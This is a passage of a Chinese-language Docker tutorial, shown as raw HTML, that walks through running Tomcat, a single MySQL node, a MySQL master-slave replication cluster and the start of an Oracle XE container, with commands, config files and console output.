comment"># docker ps</span>CONTAINER ID   IMAGE        COMMAND             CREATED         STATUS         PORTS                                       NAMESf456e705d48f   tomcat:9<span class="token punctuation">.</span>0   <span class="token string">"catalina.sh run"</span>   3 seconds ago   Up 2 seconds   0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:8081-&gt;8080/tcp<span class="token punctuation">,</span> :::8081-&gt;8080/tcp   cool_germain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># echo "tomcat running" &gt; /opt/tomcat-server/index.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>在宿主机访问</strong></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211162127222.png" alt="image-20220211162127222"></p><h1 id="四、使用Docker容器实现MySQL部署"><a href="#四、使用Docker容器实现MySQL部署" class="headerlink" title="四、使用Docker容器实现MySQL部署"></a>四、使用Docker容器实现MySQL部署</h1><h2 id="4-1-单节点MySQL部署"><a href="#4-1-单节点MySQL部署" class="headerlink" title="4.1 单节点MySQL部署"></a>4.1 单节点MySQL部署</h2><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211162728055.png" alt="image-20220211162728055"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211162817731.png" alt="image-20220211162817731"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211162911952.png" alt="image-20220211162911952"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -p 3306:3306 \</span> <span class="token operator">--</span>name mysql \ <span class="token operator">-</span>v <span class="token operator">/</span>opt/mysql/log:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/mysql \ <span class="token operator">-</span>v <span class="token operator">/</span>opt/mysql/<span class="token keyword">data</span>:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/mysql \ <span class="token operator">-</span>v <span class="token operator">/</span>opt/mysql/conf:<span class="token operator">/</span>etc/mysql \ <span class="token operator">-</span>e MYSQL_ROOT_PASSWORD=root \ <span class="token operator">-</span>d \ mysql:5<span class="token punctuation">.</span>7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE       COMMAND                  CREATED          STATUS          PORTS                                                  NAMES6d16ca21cf31   mysql:5<span class="token punctuation">.</span>7   <span class="token string">"docker-entrypoint.s…"</span>   32 seconds ago   Up 30 seconds   0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:3306-&gt;3306/tcp<span class="token punctuation">,</span> :::3306-&gt;3306/tcp<span class="token punctuation">,</span> 33060/tcp   mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">通过容器中客户端访问<span class="token comment"># docker exec -it mysql mysql -uroot -proot</span>mysql: <span class="token namespace">[Warning]</span> <span class="token keyword">Using</span> a password on the command line interface can be insecure<span class="token punctuation">.</span>Welcome to the MySQL monitor<span class="token punctuation">.</span>  Commands <span class="token keyword">end</span> with <span class="token punctuation">;</span> or \g<span class="token punctuation">.</span>Your MySQL connection id is 4Server version: 5<span class="token punctuation">.</span>7<span class="token punctuation">.</span>37 MySQL Community Server <span class="token punctuation">(</span>GPL<span class="token punctuation">)</span>Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2000<span class="token punctuation">,</span> 2022<span class="token punctuation">,</span> Oracle and/or its affiliates<span class="token punctuation">.</span>Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates<span class="token punctuation">.</span> Other names may be trademarks of their respectiveowners<span class="token punctuation">.</span><span class="token function">Type</span> <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help<span class="token punctuation">.</span> <span class="token function">Type</span> <span class="token string">'\c'</span> to clear the current input statement<span class="token punctuation">.</span>mysql&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在docker host上访问<span class="token comment"># yum -y install mariadb</span><span class="token comment"># mysql -h 192.168.255.157 -uroot -proot -P 3306</span>Welcome to the MariaDB monitor<span class="token punctuation">.</span>  Commands <span class="token keyword">end</span> with <span class="token punctuation">;</span> or \g<span class="token punctuation">.</span>Your MySQL connection id is 7Server version: 5<span class="token punctuation">.</span>7<span class="token punctuation">.</span>37 MySQL Community Server <span class="token punctuation">(</span>GPL<span class="token punctuation">)</span>Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2000<span class="token punctuation">,</span> 2018<span class="token punctuation">,</span> Oracle<span class="token punctuation">,</span> MariaDB Corporation Ab and others<span class="token punctuation">.</span><span class="token function">Type</span> <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help<span class="token punctuation">.</span> <span class="token function">Type</span> <span class="token string">'\c'</span> to clear the current input statement<span class="token punctuation">.</span>MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span>&gt; show databases<span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token punctuation">|</span> Database           <span class="token punctuation">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token punctuation">|</span> information_schema <span class="token punctuation">|</span><span class="token punctuation">|</span> mysql              <span class="token punctuation">|</span><span class="token punctuation">|</span> performance_schema <span class="token punctuation">|</span><span class="token punctuation">|</span> sys                <span class="token punctuation">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span>4 rows in <span class="token function">set</span> <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00 sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-2-MySQL主从复制集群部署"><a href="#4-2-MySQL主从复制集群部署" class="headerlink" title="4.2 MySQL主从复制集群部署"></a>4.2 MySQL主从复制集群部署</h2><h3 id="4-2-1-MySQL主节点部署"><a href="#4-2-1-MySQL主节点部署" class="headerlink" title="4.2.1 MySQL主节点部署"></a>4.2.1 MySQL主节点部署</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -p 3306:3306 \</span> <span class="token operator">--</span>name mysql-master \ <span class="token operator">-</span>v <span class="token operator">/</span>opt/mysql-master/log:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/mysql \ <span class="token operator">-</span>v <span class="token operator">/</span>opt/mysql-master/<span class="token keyword">data</span>:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/mysql \ <span class="token operator">-</span>v <span class="token operator">/</span>opt/mysql-master/conf:<span class="token operator">/</span>etc/mysql \ <span class="token operator">-</span>e MYSQL_ROOT_PASSWORD=root \ <span class="token operator">-</span>d mysql:5<span class="token punctuation">.</span>7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE       COMMAND                  CREATED          STATUS          PORTS                                                  NAMES2dbbed8e35c7   mysql:5<span class="token punctuation">.</span>7   <span class="token string">"docker-entrypoint.s…"</span>   58 seconds ago   Up 57 seconds   0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:3306-&gt;3306/tcp<span class="token punctuation">,</span> :::3306-&gt;3306/tcp<span class="token punctuation">,</span> 33060/tcp   mysql-master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-2-2-MySQL主节点配置"><a href="#4-2-2-MySQL主节点配置" class="headerlink" title="4.2.2 MySQL主节点配置"></a>4.2.2 MySQL主节点配置</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># vim /opt/mysql-master/conf/my.cnf</span><span class="token comment"># cat /opt/mysql-master/conf/my.cnf</span><span class="token namespace">[client]</span>default-character-<span class="token function">set</span>=utf8<span class="token namespace">[mysql]</span>default-character-<span class="token function">set</span>=utf8<span class="token namespace">[mysqld]</span>init_connect=<span class="token string">'SET collation_connection = utf8_unicode_ci'</span>init_connect=<span class="token string">'SET NAMES utf8'</span>character-<span class="token function">set-server</span>=utf8collation-server=utf8_unicode_ci<span class="token function">skip-character</span><span class="token operator">-</span><span class="token function">set-client</span><span class="token operator">-</span>handshake<span class="token function">skip-name</span><span class="token operator">-</span>resolveserver_id=1log-bin=mysql-bin<span class="token function">read-only</span>=0binlog-<span class="token keyword">do</span><span class="token operator">-</span>db=kubemsb_testreplicate-ignore-db=mysqlreplicate-ignore-db=sysreplicate-ignore-db=information_schemareplicate-ignore-db=performance_schema<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-3-MySQL从节点部署"><a href="#4-2-3-MySQL从节点部署" class="headerlink" title="4.2.3 MySQL从节点部署"></a>4.2.3 MySQL从节点部署</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -p 3307:3306 \</span> <span class="token operator">--</span>name mysql-slave \ <span class="token operator">-</span>v <span class="token operator">/</span>opt/mysql-slave/log:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/mysql \ <span class="token operator">-</span>v <span class="token operator">/</span>opt/mysql-slave/<span class="token keyword">data</span>:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/mysql \ <span class="token operator">-</span>v <span class="token operator">/</span>opt/mysql-slave/conf:<span class="token operator">/</span>etc/mysql \ <span class="token operator">-</span>e MYSQL_ROOT_PASSWORD=root \ <span class="token operator">-</span>d  <span class="token operator">--</span>link mysql-master:mysql-master mysql:5<span class="token punctuation">.</span>7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE       COMMAND                  CREATED         STATUS         PORTS                                                  NAMEScaf7bf3fc68f   mysql:5<span class="token punctuation">.</span>7   <span class="token string">"docker-entrypoint.s…"</span>   8 seconds ago   Up 6 seconds   33060/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:3307-&gt;3306/tcp<span class="token punctuation">,</span> :::3307-&gt;3306/tcp   mysql-slave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-2-4-MySQL从节点配置"><a href="#4-2-4-MySQL从节点配置" class="headerlink" title="4.2.4 MySQL从节点配置"></a>4.2.4 MySQL从节点配置</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># vim /opt/mysql-slave/conf/my.cnf</span><span class="token comment"># cat /opt/mysql-slave/conf/my.cnf</span><span class="token namespace">[client]</span>default-character-<span class="token function">set</span>=utf8<span class="token namespace">[mysql]</span>default-character-<span class="token function">set</span>=utf8<span class="token namespace">[mysqld]</span>init_connect=<span class="token string">'SET collation_connection = utf8_unicode_ci'</span>init_connect=<span class="token string">'SET NAMES utf8'</span>character-<span class="token function">set-server</span>=utf8collation-server=utf8_unicode_ci<span class="token function">skip-character</span><span class="token operator">-</span><span class="token function">set-client</span><span class="token operator">-</span>handshake<span class="token function">skip-name</span><span class="token operator">-</span>resolveserver_id=2log-bin=mysql-bin<span class="token function">read-only</span>=1binlog-<span class="token keyword">do</span><span class="token operator">-</span>db=kubemsb_testreplicate-ignore-db=mysqlreplicate-ignore-db=sysreplicate-ignore-db=information_schemareplicate-ignore-db=performance_schema<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-5-master节点配置"><a href="#4-2-5-master节点配置" class="headerlink" title="4.2.5 master节点配置"></a>4.2.5 master节点配置</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># mysql -h 192.168.255.157 -uroot -proot -P 3306</span>Welcome to the MariaDB monitor<span class="token punctuation">.</span>  Commands <span class="token keyword">end</span> with <span class="token punctuation">;</span> or \g<span class="token punctuation">.</span>Your MySQL connection id is 2Server version: 5<span class="token punctuation">.</span>7<span class="token punctuation">.</span>37 MySQL Community Server <span class="token punctuation">(</span>GPL<span class="token punctuation">)</span>Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2000<span class="token punctuation">,</span> 2018<span class="token punctuation">,</span> Oracle<span class="token punctuation">,</span> MariaDB Corporation Ab and others<span class="token punctuation">.</span><span class="token function">Type</span> <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help<span class="token punctuation">.</span> <span class="token function">Type</span> <span class="token string">'\c'</span> to clear the current input statement<span class="token punctuation">.</span>MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span>&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">授权MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span>&gt; grant replication slave on <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> to <span class="token string">'backup'</span>@<span class="token string">'%'</span> identified by <span class="token string">'123456'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">重启容器，使用配置生效<span class="token comment"># docker restart mysql-master</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看状态MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span>&gt; show master status\G<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span> 1<span class="token punctuation">.</span> row <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>             File: mysql-bin<span class="token punctuation">.</span>000001         Position: 154     Binlog_Do_DB: kubemsb_test Binlog_Ignore_DB:Executed_Gtid_Set:1 row in <span class="token function">set</span> <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00 sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-6-slave节点配置"><a href="#4-2-6-slave节点配置" class="headerlink" title="4.2.6 slave节点配置"></a>4.2.6 slave节点配置</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker restart mysql-slave</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># mysql -h 192.168.255.157 -uroot -proot -P 3307</span>Welcome to the MariaDB monitor<span class="token punctuation">.</span>  Commands <span class="token keyword">end</span> with <span class="token punctuation">;</span> or \g<span class="token punctuation">.</span>Your MySQL connection id is 2Server version: 5<span class="token punctuation">.</span>7<span class="token punctuation">.</span>37 MySQL Community Server <span class="token punctuation">(</span>GPL<span class="token punctuation">)</span>Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2000<span class="token punctuation">,</span> 2018<span class="token punctuation">,</span> Oracle<span class="token punctuation">,</span> MariaDB Corporation Ab and others<span class="token punctuation">.</span><span class="token function">Type</span> <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help<span class="token punctuation">.</span> <span class="token function">Type</span> <span class="token string">'\c'</span> to clear the current input statement<span class="token punctuation">.</span>MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span>&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span>&gt; change master to master_host=<span class="token string">'mysql-master'</span><span class="token punctuation">,</span> master_user=<span class="token string">'backup'</span><span class="token punctuation">,</span> master_password=<span class="token string">'123456'</span><span class="token punctuation">,</span> master_log_file=<span class="token string">'mysql-bin.000001'</span><span class="token punctuation">,</span> master_log_pos=154<span class="token punctuation">,</span> master_port=3306<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span>&gt; <span class="token function">start</span> slave<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span>&gt; show slave status\G<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span> 1<span class="token punctuation">.</span> row <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>               Slave_IO_State: Waiting <span class="token keyword">for</span> master to send event                  Master_Host: mysql-master                  Master_User: backup                  Master_Port: 3306                Connect_Retry: 60              Master_Log_File: mysql-bin<span class="token punctuation">.</span>000001          Read_Master_Log_Pos: 154               Relay_Log_File: e0872f94c377-relay-bin<span class="token punctuation">.</span>000002                Relay_Log_Pos: 320        Relay_Master_Log_File: mysql-bin<span class="token punctuation">.</span>000001             Slave_IO_Running: Yes            Slave_SQL_Running: Yes              Replicate_Do_DB:          Replicate_Ignore_DB: mysql<span class="token punctuation">,</span>sys<span class="token punctuation">,</span>information_schema<span class="token punctuation">,</span>performance_schema           Replicate_Do_Table:       Replicate_Ignore_Table:      Replicate_Wild_Do_Table:  Replicate_Wild_Ignore_Table:                   Last_Errno: 0                   Last_Error:                 Skip_Counter: 0          Exec_Master_Log_Pos: 154              Relay_Log_Space: 534              Until_Condition: None               Until_Log_File:                Until_Log_Pos: 0           Master_SSL_Allowed: No           Master_SSL_CA_File:           Master_SSL_CA_Path:              Master_SSL_Cert:            Master_SSL_Cipher:               Master_SSL_Key:        Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No                Last_IO_Errno: 0                Last_IO_Error:               Last_SQL_Errno: 0               Last_SQL_Error:  Replicate_Ignore_Server_Ids:             Master_Server_Id: 1                  Master_UUID: 0130b415-8b21-11ec-8982-0242ac110002             Master_Info_File: <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/mysql/master<span class="token punctuation">.</span>info                    SQL_Delay: 0          SQL_Remaining_Delay: NULL      Slave_SQL_Running_State: Slave has read all relay log<span class="token punctuation">;</span> waiting <span class="token keyword">for</span> more updates           Master_Retry_Count: 86400                  Master_Bind:      Last_IO_Error_Timestamp:     Last_SQL_Error_Timestamp:               Master_SSL_Crl:           Master_SSL_Crlpath:           Retrieved_Gtid_Set:            Executed_Gtid_Set:                Auto_Position: 0         Replicate_Rewrite_DB:                 Channel_Name:           Master_TLS_Version:1 row in <span class="token function">set</span> <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00 sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-7-验证MySQL集群可用性"><a href="#4-2-7-验证MySQL集群可用性" class="headerlink" title="4.2.7 验证MySQL集群可用性"></a>4.2.7 验证MySQL集群可用性</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在MySQL Master节点添加kubemsb_test数据库<span class="token comment"># mysql -h 192.168.255.157 -uroot -proot -P3306</span>MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span>&gt; create database kubemsb_test<span class="token punctuation">;</span>Query OK<span class="token punctuation">,</span> 1 row affected <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00 sec<span class="token punctuation">)</span>MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span>&gt; show databases<span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token punctuation">|</span> Database           <span class="token punctuation">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token punctuation">|</span> information_schema <span class="token punctuation">|</span><span class="token punctuation">|</span> kubemsb_test       <span class="token punctuation">|</span>     <span class="token punctuation">|</span><span class="token punctuation">|</span> mysql              <span class="token punctuation">|</span><span class="token punctuation">|</span> performance_schema <span class="token punctuation">|</span><span class="token punctuation">|</span> sys                <span class="token punctuation">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span>6 rows in <span class="token function">set</span> <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00 sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在MySQL Slave节点查看同步情况<span class="token comment"># mysql -h 192.168.255.157 -uroot -proot -P3307</span>MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span>&gt; show databases<span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token punctuation">|</span> Database           <span class="token punctuation">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token punctuation">|</span> information_schema <span class="token punctuation">|</span><span class="token punctuation">|</span> kubemsb_test       <span class="token punctuation">|</span><span class="token punctuation">|</span> mysql              <span class="token punctuation">|</span><span class="token punctuation">|</span> performance_schema <span class="token punctuation">|</span><span class="token punctuation">|</span> sys                <span class="token punctuation">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span>5 rows in <span class="token function">set</span> <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00 sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、使用Docker容器实现Oracle部署"><a href="#五、使用Docker容器实现Oracle部署" class="headerlink" title="五、使用Docker容器实现Oracle部署"></a>五、使用Docker容器实现Oracle部署</h1><h2 id="5-1-获取参考资料"><a href="#5-1-获取参考资料" class="headerlink" title="5.1 获取参考资料"></a>5.1 获取参考资料</h2><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212111348491.png" alt="image-20220212111348491"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212111511130.png" alt="image-20220212111511130"></p><h2 id="5-2-运行oracle容器"><a href="#5-2-运行oracle容器" class="headerlink" title="5.2 运行oracle容器"></a>5.2 运行oracle容器</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker pull oracleinanutshell/oracle-xe-11g</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" 